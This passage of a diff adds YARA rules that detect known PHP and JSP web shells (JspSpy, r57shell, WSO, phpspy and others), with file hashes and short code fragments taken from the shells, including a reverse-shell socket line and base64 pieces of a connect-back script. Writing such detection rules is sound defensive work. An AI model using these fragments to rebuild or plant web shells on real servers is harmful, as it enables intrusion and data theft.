+		hash1 = "bd6d3b2763c705a01cc2b3f105a25fa4"
+		hash2 = "40c6ecf77253e805ace85f119fe1cebb"
+	strings:
+		$s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b"
+		$s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'"
+	condition:
+		all of them
+}
+
+rule webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx {
+	meta:
+		description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, t00ls.jsp, u.jsp, xia.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
+		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
+		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
+		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
+		hash4 = "8b457934da3821ba58b06a113e0d53d9"
+		hash5 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
+		hash6 = "14e9688c86b454ed48171a9d4f48ace8"
+		hash7 = "b330a6c2d49124ef0729539761d6ef0b"
+		hash8 = "d71716df5042880ef84427acee8b121e"
+		hash9 = "341298482cf90febebb8616426080d1d"
+		hash10 = "29aebe333d6332f0ebc2258def94d57e"
+		hash11 = "42654af68e5d4ea217e6ece5389eb302"
+		hash12 = "88fc87e7c58249a398efd5ceae636073"
+		hash13 = "4a812678308475c64132a9b56254edbc"
+		hash14 = "9626eef1a8b9b8d773a3b2af09306a10"
+		hash15 = "344f9073576a066142b2023629539ebd"
+		hash16 = "32dea47d9c13f9000c4c807561341bee"
+		hash17 = "90a5ba0c94199269ba33a58bc6a4ad99"
+		hash18 = "655722eaa6c646437c8ae93daac46ae0"
+		hash19 = "b9744f6876919c46a29ea05b1d95b1c3"
+		hash20 = "9c94637f76e68487fa33f7b0030dd932"
+		hash21 = "6acc82544be056580c3a1caaa4999956"
+		hash22 = "6aa32a6392840e161a018f3907a86968"
+		hash23 = "349ec229e3f8eda0f9eb918c74a8bf4c"
+		hash24 = "3ea688e3439a1f56b16694667938316d"
+		hash25 = "ab77e4d1006259d7cbc15884416ca88c"
+		hash26 = "71097537a91fac6b01f46f66ee2d7749"
+		hash27 = "2434a7a07cb47ce25b41d30bc291cacc"
+		hash28 = "7a4b090619ecce6f7bd838fe5c58554b"
+	strings:
+		$s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype="
+		$s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T"
+	condition:
+		all of them
+}
+
+rule webshell_2_520_job_ma1_ma4_2 {
+	meta:
+		description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "64a3bf9142b045b9062b204db39d4d57"
+		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
+		hash2 = "56c005690da2558690c4aa305a31ad37"
+		hash3 = "532b93e02cddfbb548ce5938fe2f5559"
+		hash4 = "6e0fa491d620d4af4b67bae9162844ae"
+		hash5 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
+	strings:
+		$s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" "
+		$s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR"
+	condition:
+		all of them
+}
+
+rule webshell_wso2_5_1_wso2_5_wso2 {
+	meta:
+		description = "Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "dbeecd555a2ef80615f0894027ad75dc"
+		hash1 = "7c8e5d31aad28eb1f0a9a53145551e05"
+		hash2 = "cbc44fb78220958f81b739b493024688"
+	strings:
+		$s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec"
+		$s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na"
+	condition:
+		all of them
+}
+
+rule webshell_000_403_c5_queryDong_spyjsp2010_t00ls {
+	meta:
+		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
+		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
+		hash2 = "8b457934da3821ba58b06a113e0d53d9"
+		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
+		hash4 = "655722eaa6c646437c8ae93daac46ae0"
+		hash5 = "9c94637f76e68487fa33f7b0030dd932"
+	strings:
+		$s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')"
+		$s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\""
+	condition:
+		all of them
+}
+
+rule webshell_404_data_suiyue {
+	meta:
+		description = "Web Shell - from files 404.jsp, data.jsp, suiyue.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "7066f4469c3ec20f4890535b5f299122"
+		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
+		hash2 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
+	strings:
+		$s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+"
+	condition:
+		all of them
+}
+
+rule webshell_r57shell_r57shell127_SnIpEr_SA_Shell_EgY_SpIdEr_ShElL_V2_r57_xxx {
+	meta:
+		description = "Web Shell - from files r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "ef43fef943e9df90ddb6257950b3538f"
+		hash1 = "ae025c886fbe7f9ed159f49593674832"
+		hash2 = "911195a9b7c010f61b66439d9048f400"
+		hash3 = "697dae78c040150daff7db751fc0c03c"
+		hash4 = "513b7be8bd0595c377283a7c87b44b2e"
+		hash5 = "1d912c55b96e2efe8ca873d6040e3b30"
+		hash6 = "e5b2131dd1db0dbdb43b53c5ce99016a"
+		hash7 = "4108f28a9792b50d95f95b9e5314fa1e"
+		hash8 = "41af6fd253648885c7ad2ed524e0692d"
+		hash9 = "6fcc283470465eed4870bcc3e2d7f14d"
+	strings:
+		$s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name"
+		$s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1"
+		$s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size="
+	condition:
+		all of them
+}
+
+rule webshell_807_a_css_dm_he1p_JspSpy_xxx {
+	meta:
+		description = "Web Shell - from files 807.jsp, a.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, nogfw.jsp, ok.jsp, style.jsp, u.jsp, xia.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
+		hash1 = "76037ebd781ad0eac363d56fc81f4b4f"
+		hash2 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
+		hash3 = "14e9688c86b454ed48171a9d4f48ace8"
+		hash4 = "b330a6c2d49124ef0729539761d6ef0b"
+		hash5 = "d71716df5042880ef84427acee8b121e"
+		hash6 = "341298482cf90febebb8616426080d1d"
+		hash7 = "29aebe333d6332f0ebc2258def94d57e"
+		hash8 = "42654af68e5d4ea217e6ece5389eb302"
+		hash9 = "88fc87e7c58249a398efd5ceae636073"
+		hash10 = "4a812678308475c64132a9b56254edbc"
+		hash11 = "9626eef1a8b9b8d773a3b2af09306a10"
+		hash12 = "344f9073576a066142b2023629539ebd"
+		hash13 = "32dea47d9c13f9000c4c807561341bee"
+		hash14 = "b9744f6876919c46a29ea05b1d95b1c3"
+		hash15 = "6acc82544be056580c3a1caaa4999956"
+		hash16 = "6aa32a6392840e161a018f3907a86968"
+		hash17 = "349ec229e3f8eda0f9eb918c74a8bf4c"
+		hash18 = "3ea688e3439a1f56b16694667938316d"
+		hash19 = "ab77e4d1006259d7cbc15884416ca88c"
+		hash20 = "71097537a91fac6b01f46f66ee2d7749"
+		hash21 = "2434a7a07cb47ce25b41d30bc291cacc"
+		hash22 = "7a4b090619ecce6f7bd838fe5c58554b"
+	strings:
+		$s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var"
+		$s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu"
+		$s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i"
+	condition:
+		all of them
+}
+
+rule webshell_201_3_ma_download {
+	meta:
+		description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "a7e25b8ac605753ed0c438db93f6c498"
+		hash1 = "fb8c6c3a69b93e5e7193036fd31a958d"
+		hash2 = "4cc68fa572e88b669bce606c7ace0ae9"
+		hash3 = "fa87bbd7201021c1aefee6fcc5b8e25a"
+	strings:
+		$s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su"
+		$s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but"
+		$s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class="
+	condition:
+		all of them
+}
+
+rule webshell_browser_201_3_400_in_JFolder_jfolder01_jsp_leo_ma_warn_webshell_nc_download {
+	meta:
+		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, ma.jsp, warn.jsp, webshell-nc.jsp, download.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
+		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
+		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
+		hash3 = "36331f2c81bad763528d0ae00edf55be"
+		hash4 = "793b3d0a740dbf355df3e6f68b8217a4"
+		hash5 = "8979594423b68489024447474d113894"
+		hash6 = "ec482fc969d182e5440521c913bab9bd"
+		hash7 = "f98d2b33cd777e160d1489afed96de39"
+		hash8 = "4b4c12b3002fad88ca6346a873855209"
+		hash9 = "4cc68fa572e88b669bce606c7ace0ae9"
+		hash10 = "e9a5280f77537e23da2545306f6a19ad"
+		hash11 = "598eef7544935cf2139d1eada4375bb5"
+		hash12 = "fa87bbd7201021c1aefee6fcc5b8e25a"
+	strings:
+		$s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
+		$s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword
+	condition:
+		all of them
+}
+
+rule webshell_shell_phpspy_2006_arabicspy {
+	meta:
+		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "791708057d8b429d91357d38edf43cc0"
+		hash1 = "40a1f840111996ff7200d18968e42cfe"
+		hash2 = "e0202adff532b28ef1ba206cf95962f2"
+	strings:
+		$s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype"
+		$s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P"
+	condition:
+		all of them
+}
+
+rule webshell_in_JFolder_jfolder01_jsp_leo_warn {
+	meta:
+		description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "793b3d0a740dbf355df3e6f68b8217a4"
+		hash1 = "8979594423b68489024447474d113894"
+		hash2 = "ec482fc969d182e5440521c913bab9bd"
+		hash3 = "f98d2b33cd777e160d1489afed96de39"
+		hash4 = "4b4c12b3002fad88ca6346a873855209"
+		hash5 = "e9a5280f77537e23da2545306f6a19ad"
+	strings:
+		$s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD"
+		$s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi"
+	condition:
+		all of them
+}
+
+rule webshell_shell_phpspy_2006_arabicspy_hkrkoz {
+	meta:
+		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "791708057d8b429d91357d38edf43cc0"
+		hash1 = "40a1f840111996ff7200d18968e42cfe"
+		hash2 = "e0202adff532b28ef1ba206cf95962f2"
+		hash3 = "802f5cae46d394b297482fd0c27cb2fc"
+	strings:
+		$s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
+	condition:
+		all of them
+}
+
+rule webshell_2008_2009lite_2009mssql {
+	meta:
+		description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
+		hash1 = "3f4d454d27ecc0013e783ed921eeecde"
+		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
+	strings:
+		$s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');"
+		$s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all"
+	condition:
+		all of them
+}
+
+rule webshell_shell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_arabicspy_PHPSPY_hkrkoz {
+	meta:
+		description = "Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "791708057d8b429d91357d38edf43cc0"
+		hash1 = "b68bfafc6059fd26732fa07fb6f7f640"
+		hash2 = "42f211cec8032eb0881e87ebdb3d7224"
+		hash3 = "40a1f840111996ff7200d18968e42cfe"
+		hash4 = "e0202adff532b28ef1ba206cf95962f2"
+		hash5 = "0712e3dc262b4e1f98ed25760b206836"
+		hash6 = "802f5cae46d394b297482fd0c27cb2fc"
+	strings:
+		$s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
+		$s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d"
+	condition:
+		all of them
+}
+
+rule webshell_807_dm_JspSpyJDK5_m_cofigrue {
+	meta:
+		description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
+		hash1 = "14e9688c86b454ed48171a9d4f48ace8"
+		hash2 = "341298482cf90febebb8616426080d1d"
+		hash3 = "88fc87e7c58249a398efd5ceae636073"
+		hash4 = "349ec229e3f8eda0f9eb918c74a8bf4c"
+	strings:
+		$s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
+		$s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword
+	condition:
+		1 of them
+}
+
+rule webshell_404_data_in_JFolder_jfolder01_xxx {
+	meta:
+		description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "7066f4469c3ec20f4890535b5f299122"
+		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
+		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
+		hash3 = "8979594423b68489024447474d113894"
+		hash4 = "ec482fc969d182e5440521c913bab9bd"
+		hash5 = "f98d2b33cd777e160d1489afed96de39"
+		hash6 = "4b4c12b3002fad88ca6346a873855209"
+		hash7 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
+		hash8 = "e9a5280f77537e23da2545306f6a19ad"
+	strings:
+		$s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE"
+	condition:
+		all of them
+}
+
+rule webshell_jsp_reverse_jsp_reverse_jspbd {
+	meta:
+		description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		super_rule = 1
+		hash0 = "8b0e6779f25a17f0ffb3df14122ba594"
+		hash1 = "ea87f0c1f0535610becadf5a98aca2fc"
+		hash2 = "7d5e9732766cf5b8edca9b7ae2b6028f"
+		score = 50
+	strings:
+		$s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
+		$s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
+		$s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword
+	condition:
+		all of them
+}
+
+rule webshell_400_in_JFolder_jfolder01_jsp_leo_warn_webshell_nc {
+	meta:
+		description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "36331f2c81bad763528d0ae00edf55be"
+		hash1 = "793b3d0a740dbf355df3e6f68b8217a4"
+		hash2 = "8979594423b68489024447474d113894"
+		hash3 = "ec482fc969d182e5440521c913bab9bd"
+		hash4 = "f98d2b33cd777e160d1489afed96de39"
+		hash5 = "4b4c12b3002fad88ca6346a873855209"
+		hash6 = "e9a5280f77537e23da2545306f6a19ad"
+		hash7 = "598eef7544935cf2139d1eada4375bb5"
+	strings:
+		$s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
+		$s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
+		$s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
+		$s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx {
+	meta:
+		description = "Web Shell - from files gfs_sh.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "a2516ac6ee41a7cf931cbaef1134a9e4"
+		hash1 = "ef43fef943e9df90ddb6257950b3538f"
+		hash2 = "ae025c886fbe7f9ed159f49593674832"
+		hash3 = "911195a9b7c010f61b66439d9048f400"
+		hash4 = "697dae78c040150daff7db751fc0c03c"
+		hash5 = "513b7be8bd0595c377283a7c87b44b2e"
+		hash6 = "1d912c55b96e2efe8ca873d6040e3b30"
+		hash7 = "e5b2131dd1db0dbdb43b53c5ce99016a"
+		hash8 = "4108f28a9792b50d95f95b9e5314fa1e"
+		hash9 = "41af6fd253648885c7ad2ed524e0692d"
+		hash10 = "6fcc283470465eed4870bcc3e2d7f14d"
+	strings:
+		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
+		$s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC"
+	condition:
+		all of them
+}
+
+rule webshell_itsec_PHPJackal_itsecteam_shell_jHn {
+	meta:
+		description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
+		hash1 = "e2830d3286001d1455479849aacbbb38"
+		hash2 = "bd6d3b2763c705a01cc2b3f105a25fa4"
+		hash3 = "40c6ecf77253e805ace85f119fe1cebb"
+	strings:
+		$s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
+		$s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|"
+		$s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+"
+	condition:
+		2 of them
+}
+
+rule webshell_NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_xxx1 {
+	meta:
+		description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
+		hash1 = "f3ca29b7999643507081caab926e2e74"
+		hash2 = "527cf81f9272919bf872007e21c4bdda"
+	strings:
+		$s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type="
+		$s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
+		$s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
+		$s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_he1p_JspSpy_nogfw_ok_style_1_JspSpy1 {
+	meta:
+		description = "Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "b330a6c2d49124ef0729539761d6ef0b"
+		hash1 = "d71716df5042880ef84427acee8b121e"
+		hash2 = "344f9073576a066142b2023629539ebd"
+		hash3 = "32dea47d9c13f9000c4c807561341bee"
+		hash4 = "b9744f6876919c46a29ea05b1d95b1c3"
+		hash5 = "3ea688e3439a1f56b16694667938316d"
+		hash6 = "2434a7a07cb47ce25b41d30bc291cacc"
+	strings:
+		$s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
+		$s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?"
+		$s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
+		$s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>"
+	condition:
+		2 of them
+}
+
+rule webshell_r57shell127_r57_iFX_r57_kartal_r57_antichat {
+	meta:
+		description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "ae025c886fbe7f9ed159f49593674832"
+		hash1 = "513b7be8bd0595c377283a7c87b44b2e"
+		hash2 = "1d912c55b96e2efe8ca873d6040e3b30"
+		hash3 = "4108f28a9792b50d95f95b9e5314fa1e"
+		hash4 = "3f71175985848ee46cc13282fbed2269"
+	strings:
+		$s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d"
+		$s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
+		$s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
+		$s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_000_403_807_a_c5_config_css_dm_he1p_xxx {
+	meta:
+		description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, config.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, myxx.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, u.jsp, xia.jsp, zend.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
+		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
+		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
+		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
+		hash4 = "8b457934da3821ba58b06a113e0d53d9"
+		hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
+		hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
+		hash7 = "14e9688c86b454ed48171a9d4f48ace8"
+		hash8 = "b330a6c2d49124ef0729539761d6ef0b"
+		hash9 = "d71716df5042880ef84427acee8b121e"
+		hash10 = "341298482cf90febebb8616426080d1d"
+		hash11 = "29aebe333d6332f0ebc2258def94d57e"
+		hash12 = "42654af68e5d4ea217e6ece5389eb302"
+		hash13 = "88fc87e7c58249a398efd5ceae636073"
+		hash14 = "4a812678308475c64132a9b56254edbc"
+		hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
+		hash16 = "e0354099bee243702eb11df8d0e046df"
+		hash17 = "344f9073576a066142b2023629539ebd"
+		hash18 = "32dea47d9c13f9000c4c807561341bee"
+		hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
+		hash20 = "655722eaa6c646437c8ae93daac46ae0"
+		hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
+		hash22 = "6acc82544be056580c3a1caaa4999956"
+		hash23 = "6aa32a6392840e161a018f3907a86968"
+		hash24 = "591ca89a25f06cf01e4345f98a22845c"
+		hash25 = "349ec229e3f8eda0f9eb918c74a8bf4c"
+		hash26 = "3ea688e3439a1f56b16694667938316d"
+		hash27 = "ab77e4d1006259d7cbc15884416ca88c"
+		hash28 = "71097537a91fac6b01f46f66ee2d7749"
+		hash29 = "2434a7a07cb47ce25b41d30bc291cacc"
+		hash30 = "7a4b090619ecce6f7bd838fe5c58554b"
+	strings:
+		$s3 = "String savePath = request.getParameter(\"savepath\");" fullword
+		$s4 = "URL downUrl = new URL(downFileUrl);" fullword
+		$s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
+		$s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
+		$s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
+		$s8 = "URLConnection conn = downUrl.openConnection();" fullword
+		$s9 = "sis = request.getInputStream();" fullword
+	condition:
+		4 of them
+}
+
+rule webshell_2_520_icesword_job_ma1 {
+	meta:
+		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "64a3bf9142b045b9062b204db39d4d57"
+		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
+		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
+		hash3 = "56c005690da2558690c4aa305a31ad37"
+		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
+	strings:
+		$s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
+		$s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
+		$s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_404_data_in_JFolder_jfolder01_jsp_suiyue_warn {
+	meta:
+		description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "7066f4469c3ec20f4890535b5f299122"
+		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
+		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
+		hash3 = "8979594423b68489024447474d113894"
+		hash4 = "ec482fc969d182e5440521c913bab9bd"
